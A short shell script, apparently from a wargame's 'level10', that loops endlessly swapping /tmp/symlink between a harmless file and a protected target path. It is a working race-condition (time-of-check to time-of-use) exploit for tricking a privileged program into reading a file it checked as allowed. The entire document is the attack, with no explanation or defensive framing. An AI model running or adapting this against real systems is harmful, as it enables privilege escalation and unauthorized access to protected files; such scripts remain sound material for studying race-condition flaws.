#!/bin/sh

while :
do
        ln -sf /dev/shm/file.txt /tmp/symlink
        ln -sf /home/user/level10/symlink /tmp/symlink
done
